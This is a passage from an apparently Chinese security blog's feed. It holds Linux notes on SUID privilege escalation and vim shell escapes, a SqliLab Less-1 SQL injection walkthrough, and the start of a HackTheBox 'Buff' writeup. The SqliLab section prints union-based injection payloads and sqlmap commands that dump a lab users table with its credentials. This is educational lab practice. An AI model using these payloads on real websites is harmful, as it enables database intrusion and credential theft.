rel="noopener">http://c.biancheng.net/view/840.html</a></p><h2 id="Linux-etc-passwd"><a href="#Linux-etc-passwd" class="headerlink" title="Linux /etc/passwd"></a>Linux /etc/passwd</h2><p>详细解析：<a href="http://c.biancheng.net/view/839.html" target="_blank" rel="noopener">http://c.biancheng.net/view/839.html</a></p><h2 id="ls-l"><a href="#ls-l" class="headerlink" title="ls -l"></a>ls -l</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># ls -l /usr/bin/find</span>-rwxr-xr-x 1 root root 315904 9月   1  2019 /usr/bin/find</code></pre><ol><li>第一列：规定了不同的用户对文件所拥有的权限，具体权限的含义将在后续章节中讲解。</li><li>第二列：引用计数，文件的引用计数代表该文件的硬链接个数，而目录的引用计数代表该目录有多少个一级子目录。</li><li><em>第三列：所有者，也就是这个文件属于哪个用户。默认所有者是文件的建立用户。</em></li><li><em>第四列：所属组，默认所属组是文件建立用户的有效组，一般情况下就是建立用户的所在组。</em></li><li>第五列：大小，默认单位是字节。</li><li>第六列：文件修改时间，文件状态修改时间或文件数据修改时间都会更改这个时间，注意这个时间不是文件的创建时间。</li><li>第七列：文件名或目录名。</li></ol><h2 id="drupal7目录结构"><a href="#drupal7目录结构" class="headerlink" title="drupal7目录结构"></a>drupal7目录结构</h2><p>/includes 系统的核心函数<br>/misc 系统核心用的一些js脚本 图片资源等<br>/modules 系统核心模块<br>/profiles 安装配置文件 里面包括minimal（最小化安装）standard（标准安装）两种配置，区别是标准安装会在数据库创建2中节点的类型：页面和消息类型，还有tag术语表，最小化安装则所有节点类型都需要自己来创建<br>/scripts 命令行脚本 在命令行可以执行的脚本文件，包括安装脚本，数据库备份脚本等<br>/themes 系统默认主题<br>/sites 所有你自己的东西都要放在这个目录里，包括模块、主题、js脚本库。<br>/sites/default/settings.php 配置文件，主要是数据库连接配置<br>/sites/default/files 用户上传的文件和图片缓存 css缓存 js缓存等等<br>/sites/all/themes 用户的主题和第三方主题<br>/sites/all/modules 用户自定义模块和第三方模块<br>/sites/all/libraries 第三方js库 如在线编辑器、语法高亮库</p><p>/index.php drupal系统的入口，负责所有页面的请求，调度到相应的处理程序，打印相应的页面。<br>/cron.php 计划任务执行程序，会定期执行一些数据的清理工作。<br>/install.php drupal安装程序 如果想重装drupal 清空数据库之后，执行/install.php就会重新安装，如果不清空数据库就会出错。<br>/robots.txt 告诉网络爬虫不要获取网站的某些部分<br>/update.php drupal的升级<br>/xmlrpc.php xmlrpc服务<br>.htaccess apache的目录配置文件 url重写配置 将请求映射到index.php</p><h2 id="Linux下用SUID提权"><a href="#Linux下用SUID提权" class="headerlink" title="Linux下用SUID提权"></a>Linux下用SUID提权</h2><p><a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">Linux下用SUID提权_谢公子的博客-CSDN博客_suid提权</a></p><p><a href="https://www.cnblogs.com/qlwy/archive/2011/06/26/2121919.html" target="_blank" rel="noopener">linux权限补充：rwt rwT rws rwS 特殊权限 - csqlwy - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/7258" target="_blank" rel="noopener">谈一谈Linux与suid提权 - 先知社区 (aliyun.com)</a></p><p><strong>setuid：该位是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令</strong></p><h2 id="SUID、SGID详解"><a href="#SUID、SGID详解" class="headerlink" title="SUID、SGID详解"></a>SUID、SGID详解</h2><p><a href="https://www.jianshu.com/p/71acd8dad454" target="_blank" rel="noopener">linux：SUID、SGID详解 - 简书 (jianshu.com)</a></p><h2 id="find-后面的-exec"><a href="#find-后面的-exec" class="headerlink" title="find 后面的 -exec"></a>find 后面的 -exec</h2><p><a href="https://www.cnblogs.com/fengliu-/p/10220809.html" target="_blank" rel="noopener">find命令之exec</a></p><p>使用find时，只要把想要的操作写在一个文件里，就可以用exec来配合find 查找，很方便的。在有些操作系统中，只允许 -exec 选项执行诸如 ls 或 ls -l 这样的命令。大多数用户使用着一些选项是为了查找旧文件并删除它们。建议再真正执行 rm 命令删除文件之前，最好先用 ls 命令看一下，确认他们是所要删除的文件。 exec 选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个\，最后是一个分号。为了使用 exec 选项，必须要同时使用 print 选项。如果验证一下 find 命令，会发现该命令只输出从当前路径起的相对路径及文件名。</p><h2 id="sh脚本语法"><a href="#sh脚本语法" class="headerlink" title=".sh脚本语法"></a>.sh脚本语法</h2><p><a href="https://blog.csdn.net/missshirly/article/details/7496809" target="_blank" rel="noopener">sh脚本语法_sh脚本</a></p><p>程序必须以下面的行开始（必须方在文件的第一行）：<br>#!/bin/sh<br>符号<em>#!*用来告诉系统它后面的参数是用来执行该文件的程序。在这个例子中我们使用</em>/bin/sh*来执行程序。</p><h2 id="PATH"><a href="#PATH" class="headerlink" title="$PATH"></a>$PATH</h2><p><a href="https://www.cnblogs.com/xuanbjut/p/12823809.html" target="_blank" rel="noopener">Linux PATH环境变量及作用（初学者必读） - pycod - 博客园 (cnblogs.com)</a></p><h2 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h2><h2 id="vim-vi执行命令"><a href="#vim-vi执行命令" class="headerlink" title="vim/vi执行命令"></a>vim/vi执行命令</h2><pre><code class="hljs livecodeserver">:!<span class="hljs-keyword">command</span></code></pre><p>不退出vim，并执行shell命令command，将命令输出显示在vim的命令区域，不会改变当前编辑的文件的内容，例如</p><pre><code class="hljs erlang-repl">:!ls -l</code></pre><p>特别的可以运行:!bash来启动一个bash shell并执行命令，不需要退出vim</p><h2 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h2><p><strong>/bin目录:</strong> </p><p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/" target="_blank" rel="noopener">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p><p><strong>/usr/bin目录:</strong></p><p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p><p><strong>/sbin目录:</strong> </p><p>主要放置一些系统管理的必备程序例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。</p><p><strong>/usr/sbin目录:</strong> </p><p>放置一些网路管理的必备程序例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等</p><h2 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SqliLab Less-1</title>
    <link href="/2020/09/24/SqliLab%20Less-1/"/>
    <url>/2020/09/24/SqliLab%20Less-1/</url>
    
    <content type="html"><![CDATA[<h1 id="SqliLab"><a href="#SqliLab" class="headerlink" title="SqliLab"></a>SqliLab</h1><h1 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h1><p>首先来到第一关， Less-1 的链接是</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">43.160</span><span class="hljs-regexp">/sqli/</span>Less-<span class="hljs-number">1</span><span class="hljs-regexp">/</span></code></pre><p>黄子提示的是：<strong>Please input the ID as parameter with numeric value（请输入ID作为带数值的参数）</strong></p><p>提示我们输入id的数字参数，但是链接中并没有id参数，这需要我们自己去构造</p><p>构造后的链接为以下（借助 HackBar 工具更方便），并点击 Execute</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">43.160</span><span class="hljs-regexp">/sqli/</span>Less-<span class="hljs-number">1</span><span class="hljs-regexp">/?id=1</span></code></pre><p>得到的网页如下</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200924192556.png" srcset="/img/loading.gif" alt=""></p><p>看到有两行数据出来</p><p>Your Login name:Dumb<br>Your Password:Dumb</p><p>接下来我们尝试把参数 id 的数值修改成其他数值看看</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">43.160</span><span class="hljs-regexp">/sqli/</span>Less-<span class="hljs-number">1</span><span class="hljs-regexp">/?id=2</span></code></pre><p>有不同的两条数据</p><p>Your Login name:Angelina<br>Your Password:I-kill-you</p><h2 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h2><p>SqliLab 这个平台用的是 SQL 数据，我们可以猜测他的数据是怎么查询来的。用 SQL 语言查询，大概猜测是</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ??<span class="hljs-keyword">name</span>??,??<span class="hljs-keyword">password</span>?? <span class="hljs-keyword">FROM</span> ??<span class="hljs-keyword">table</span>?? <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>(以<span class="hljs-keyword">id</span>为<span class="hljs-number">1</span>作为例子)</code></pre><p> 这里有几项是猜测的，字段名不知道（name和password是猜测的名字），表名不知道（table也是猜测的名字），where后面的 id是否是那样的也不确定。所以接下来的步骤是确定这几项元素</p><h2 id="确定-id-部分"><a href="#确定-id-部分" class="headerlink" title="确定 id 部分"></a>确定 id 部分</h2><p>我们需要知道查询语句 id 部分是否只是单纯的数字，因为有可能查询语句的 id 部分可能是这样的</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ??<span class="hljs-keyword">name</span>??,??<span class="hljs-keyword">password</span>?? <span class="hljs-keyword">FROM</span> ??<span class="hljs-keyword">table</span>?? <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span><span class="hljs-keyword">SELECT</span> ??<span class="hljs-keyword">name</span>??,??<span class="hljs-keyword">password</span>?? <span class="hljs-keyword">FROM</span> ??<span class="hljs-keyword">table</span>?? <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">"1"</span></code></pre><p>有可能 id 参数被引号或者括号包围，首先我们在 id 数值后面加一个冒号，<strong>payload</strong>：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">43.160</span><span class="hljs-regexp">/sqli/</span>Less-<span class="hljs-number">1</span><span class="hljs-regexp">/?id=1'</span></code></pre><p>这时候网页出现了黄色的警告文字：<strong>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</strong></p><p>其中<strong>‘’1’’ LIMIT 0,1’</strong>外面的一对单引号是警告里面自带的，让我们摘掉他</p><p>现在剩下<strong>‘1’’ LIMIT 0,1</strong></p><p>我们把目光放在引号那里，其中1后面的<strong>一个</strong>单引号是我们故意输入的那个单引号，<strong>剩下的那对单引号就是SQL查询语句中的</strong>了。所以我们猜测的 id 部分可以确认了，SQL语句现在是这样的了</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ??<span class="hljs-keyword">name</span>??,??<span class="hljs-keyword">password</span>?? <span class="hljs-keyword">FROM</span> ??<span class="hljs-keyword">table</span>?? <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span></code></pre><p>现在不知道是表名，两个字段名和查询所在的数据库</p><h2 id="确定数据库名"><a href="#确定数据库名" class="headerlink" title="确定数据库名"></a>确定数据库名</h2><h3 id="确定是否存在SQL注入点"><a href="#确定是否存在SQL注入点" class="headerlink" title="确定是否存在SQL注入点"></a>确定是否存在SQL注入点</h3><p>首先我们构建一个 payload 来确定以下是否存在SQL注入</p><pre><code class="hljs elixir"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.43.160/sqli</span><span class="hljs-regexp">/Less-1/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">' and '</span><span class="hljs-number">1</span><span class="hljs-string">' = '</span><span class="hljs-number">1</span></code></pre><p>这时的网页显示的是</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200924192556.png" srcset="/img/loading.gif" alt=""></p><p>也就是说 SQL 查询语句把 *<em>1’ and ‘1’ = ‘1 *</em> 包含进去了，说明存在SQL注入</p><h3 id="确定有几个字段（几列）"><a href="#确定有几个字段（几列）" class="headerlink" title="确定有几个字段（几列）"></a>确定有几个字段（几列）</h3><p>接下来再构造payload</p><pre><code class="hljs crmsh">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">43.160</span>/sqli/Less-<span class="hljs-number">1</span>/?<span class="hljs-attr">id=</span><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span> --+</code></pre><p><strong>order by 1</strong> 是说按照第一列排序，要是没有就可能会报错，我们把数字改为比较大的100就会有黄色报错，所以这样可以确定表内的列数</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200925154154.png" srcset="/img/loading.gif" alt=""></p><p>最后我们从 1 测到 4 得，一共只有 3 列，我们构造 <strong>payload</strong>：</p><pre><code class="hljs ada">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">43.160</span>/sqli/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>' union <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,<span class="hljs-number">222</span>,<span class="hljs-number">333</span> <span class="hljs-comment">--+</span></code></pre><p>利用 union 和 id 数值的错误，使得只显示 select 部分。看到网页现在显示 222，和 333</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200925154631.png" srcset="/img/loading.gif" alt=""></p><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>我们可以在222和333处构造SQL语句去非法获取信息了，比如我们现在需要的数据库名</p><pre><code class="hljs sql">http://192.168.43.160/sqli/Less-1/?id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,<span class="hljs-keyword">version</span>(),<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span></code></pre><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200925155128.png" srcset="/img/loading.gif" alt=""></p><p>数据库名为 security ，数据库版本为 5.5.53</p><h2 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h2><p>利用xxx，在文章最后的详情中查看</p><pre><code class="hljs sql">http://192.168.43.160/sqli/Less-1/?id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span></code></pre><p>Your Login name:emails,referers,uagents,users<br>Your Password:333 </p><h2 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h2><pre><code class="hljs sql">http://192.168.43.160/sqli/Less-1/?id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,<span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span> <span class="hljs-comment">--+</span></code></pre><p>Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password<br>Your Password:333</p><p>我们需要的是username，password字段的内容</p><h2 id="值"><a href="#值" class="headerlink" title="值"></a>值</h2><pre><code class="hljs sql">http://192.168.43.160/sqli/Less-1/?id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-built_in">char</span>(<span class="hljs-number">32</span>,<span class="hljs-number">58</span>,<span class="hljs-number">32</span>),<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200925161437.png" srcset="/img/loading.gif" alt=""></p><h1 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h1><h2 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># sqlmap -u "http://192.168.43.160/sqli/Less-1/?id=1" --dbs --batch</span>[*] starting @ 06:36:55 /2020-09-28/[06:36:56] [INFO] resuming back-end DBMS <span class="hljs-string">'mysql'</span> [06:36:56] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)...NULL,CONCAT(0x716a787071,0x486168517962555a684f4a69794e7244456e6a4e494c437a534175556163727a71736d74686d6f51,0x71717a6a71),NULL-- ----[06:36:58] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0[06:36:58] [INFO] fetching database names[06:36:58] [INFO] resumed: <span class="hljs-string">'information_schema'</span>[06:36:58] [INFO] resumed: <span class="hljs-string">'challenges'</span>[06:36:58] [INFO] resumed: <span class="hljs-string">'dvwa'</span>[06:36:58] [INFO] resumed: <span class="hljs-string">'mysql'</span>[06:36:58] [INFO] resumed: <span class="hljs-string">'performance_schema'</span>[06:36:58] [INFO] resumed: <span class="hljs-string">'security'</span>[06:36:58] [INFO] resumed: <span class="hljs-string">'test'</span>available databases [7]:                                                                                                             [*] challenges[*] dvwa[*] information_schema[*] mysql[*] performance_schema[*] security[*] <span class="hljs-built_in">test</span></code></pre><h2 id="枚举表"><a href="#枚举表" class="headerlink" title="枚举表"></a>枚举表</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># sqlmap -u "http://192.168.43.160/sqli/Less-1/?id=1" -D security --tables --batch</span>[*] starting @ 06:40:06 /2020-09-28/[06:40:06] [INFO] resuming back-end DBMS <span class="hljs-string">'mysql'</span> [06:40:06] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---...---[06:40:08] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0[06:40:08] [INFO] fetching tables <span class="hljs-keyword">for</span> database: <span class="hljs-string">'security'</span>[06:40:08] [INFO] resumed: <span class="hljs-string">'emails'</span>[06:40:08] [INFO] resumed: <span class="hljs-string">'referers'</span>[06:40:08] [INFO] resumed: <span class="hljs-string">'uagents'</span>[06:40:08] [INFO] resumed: <span class="hljs-string">'users'</span>Database: security                                                                                                                   [4 tables]+----------+| emails   || referers || uagents  || users    |+----------+</code></pre><p>到这里没有必要穷举列了，直接 –dump 出来就好了</p><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># sqlmap -u "http://192.168.43.160/sqli/Less-1/?id=1" -D security -T users --columns --dump --batch</span>[*] starting @ 06:43:52 /2020-09-28/[06:43:52] [INFO] resuming back-end DBMS <span class="hljs-string">'mysql'</span> [06:43:52] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---..---[06:43:54] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0[06:43:54] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">'users'</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">'security'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'id'</span>,<span class="hljs-string">'int(3)'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'username'</span>,<span class="hljs-string">'varchar(20)'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'password'</span>,<span class="hljs-string">'varchar(20)'</span>Database: security                                                                                                                   Table: users[3 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| id       | int(3)      || password | varchar(20) || username | varchar(20) |+----------+-------------+[06:43:54] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">'users'</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">'security'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'id'</span>,<span class="hljs-string">'int(3)'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'username'</span>,<span class="hljs-string">'varchar(20)'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'password'</span>,<span class="hljs-string">'varchar(20)'</span>[06:43:54] [INFO] fetching entries <span class="hljs-keyword">for</span> table <span class="hljs-string">'users'</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">'security'</span>                                                          [06:43:54] [INFO] resumed: <span class="hljs-string">'1'</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'Dumb'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'2'</span>,<span class="hljs-string">'I-kill-you'</span>,<span class="hljs-string">'Angelina'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'3'</span>,<span class="hljs-string">'p@ssword'</span>,<span class="hljs-string">'Dummy'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'4'</span>,<span class="hljs-string">'crappy'</span>,<span class="hljs-string">'secure'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'5'</span>,<span class="hljs-string">'stupidity'</span>,<span class="hljs-string">'stupid'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'6'</span>,<span class="hljs-string">'genious'</span>,<span class="hljs-string">'superman'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'7'</span>,<span class="hljs-string">'mob!le'</span>,<span class="hljs-string">'batman'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'8'</span>,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'admin'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'9'</span>,<span class="hljs-string">'admin1'</span>,<span class="hljs-string">'admin1'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'10'</span>,<span class="hljs-string">'admin2'</span>,<span class="hljs-string">'admin2'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'11'</span>,<span class="hljs-string">'admin3'</span>,<span class="hljs-string">'admin3'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'12'</span>,<span class="hljs-string">'dumbo'</span>,<span class="hljs-string">'dhakkan'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'14'</span>,<span class="hljs-string">'admin4'</span>,<span class="hljs-string">'admin4'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'15'</span>,<span class="hljs-string">'z1R!m1x!X0'</span>,<span class="hljs-string">'RYWmDdAG'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'16'</span>,<span class="hljs-string">'z4O!g8d!K2'</span>,<span class="hljs-string">'wgbDaJru'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'17'</span>,<span class="hljs-string">'r8N!r2m!H0'</span>,<span class="hljs-string">'MptMLPTl'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'18'</span>,<span class="hljs-string">'d9K!f2i!B2'</span>,<span class="hljs-string">'POyBldlB'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'19'</span>,<span class="hljs-string">'f3S!y2k!M4'</span>,<span class="hljs-string">'xztGNxJa'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'20'</span>,<span class="hljs-string">'t8U!e8i!Q9'</span>,<span class="hljs-string">'FZsbhWea'</span>[06:43:54] [INFO] resumed: <span class="hljs-string">'21'</span>,<span class="hljs-string">'x1M!a8a!E1'</span>,<span class="hljs-string">'NKtImiAx'</span>Database: security                                                                                                                   Table: users[20 entries]+------+----------+------------+| id   | username | password   |+------+----------+------------+| 1    | Dumb     | Dumb       || 2    | Angelina | I-kill-you || 3    | Dummy    | p@ssword   || 4    | secure   | crappy     || 5    | stupid   | stupidity  || 6    | superman | genious    || 7    | batman   | mob!le     || 8    | admin    | admin      || 9    | admin1   | admin1     || 10   | admin2   | admin2     || 11   | admin3   | admin3     || 12   | dhakkan  | dumbo      || 14   | admin4   | admin4     || 15   | RYWmDdAG | z1R!m1x!X0 || 16   | wgbDaJru | z4O!g8d!K2 || 17   | MptMLPTl | r8N!r2m!H0 || 18   | POyBldlB | d9K!f2i!B2 || 19   | xztGNxJa | f3S!y2k!M4 || 20   | FZsbhWea | t8U!e8i!Q9 || 21   | NKtImiAx | x1M!a8a!E1 |+------+----------+------------+[06:43:54] [INFO] table <span class="hljs-string">'`security`.users'</span> dumped to CSV file <span class="hljs-string">'/root/.local/share/sqlmap/output/192.168.43.160/dump/security/users.csv'</span>[06:43:54] [INFO] fetched data logged to text files under <span class="hljs-string">'/root/.local/share/sqlmap/output/192.168.43.160'</span>[*] ending @ 06:43:54 /2020-09-28/</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>SqliLab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Buff Writeup</title>
    <link href="/2020/09/20/HACKTHEBOX%20BUFF%20Writeup/"/>
    <url>/2020/09/20/HACKTHEBOX%20BUFF%20Writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p>Buff是HACKTHEBOX平台上的一台靶机，信息如下:</p><pre><code class="hljs yaml"><span class="hljs-string">OS:Windows</span><span class="hljs-attr">Difficulty:</span><span class="hljs-string">Easy</span><span class="hljs-attr">Points:</span><span class="hljs-number">20</span><span class="hljs-string">Release:18</span> <span class="hljs-string">Jul</span> <span class="hljs-number">2020</span><span class="hljs-attr">IP:</span><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.198</span></code></pre><p>其中有20分，分别是Own User和Own Root</p><h2 id="Own-User"><a href="#Own-User" class="headerlink" title="Own User"></a>Own User</h2><pre><code class="hljs applescript">Type <span class="hljs-keyword">below</span> <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> inside <span class="hljs-keyword">the</span> user.txt <span class="hljs-built_in">file</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> machine. The <span class="hljs-built_in">file</span> can be found under /home/&#123;username&#125; <span class="hljs-keyword">on</span> Linux machines <span class="hljs-keyword">and</span><span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> Desktop <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> user <span class="hljs-keyword">on</span> Windows.</code></pre><h2 id="Own-Root"><a href="#Own-Root" class="headerlink" title="Own Root"></a>Own Root</h2><pre><code class="hljs applescript">Type <span class="hljs-keyword">below</span> <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> inside <span class="hljs-keyword">the</span> root.txt <span class="hljs-built_in">file</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> machine. The <span class="hljs-built_in">file</span> can be found under /root <span class="hljs-keyword">on</span> Linux machines <span class="hljs-keyword">and</span> <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> Desktop<span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> Administrator <span class="hljs-keyword">on</span> Windows.</code></pre><hr><h1 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h1><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># nmap -sC -sV -A 10.10.10.198</span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 08:03 EDTNmap scan report <span class="hljs-keyword">for</span> 10.10.10.198Host is up (0.44s latency).Not shown: 999 filtered portsPORT     STATE SERVICE VERSION8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6|_http-title: mrb3n<span class="hljs-string">'s Bro HutWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): Microsoft Windows XP|7 (86%)OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7Aggressive OS guesses: Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsTRACEROUTE (using port 8080/tcp)HOP RTT       ADDRESS1   343.95 ms 10.10.14.12   422.91 ms 10.10.10.198OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 103.95 seconds</span></code></pre><p>网页：</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200920205855.png" srcset="/img/loading.gif" alt=""></p><p>目前可得的已知信息是：</p><pre><code class="hljs angelscript">顶部有账号密码登陆Contact页面：Made using Gym Management Software <span class="hljs-number">1.0</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Writeup</tag>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2019/11/12/hello-world/"/>
    <url>/2019/11/12/hello-world/</url>
    
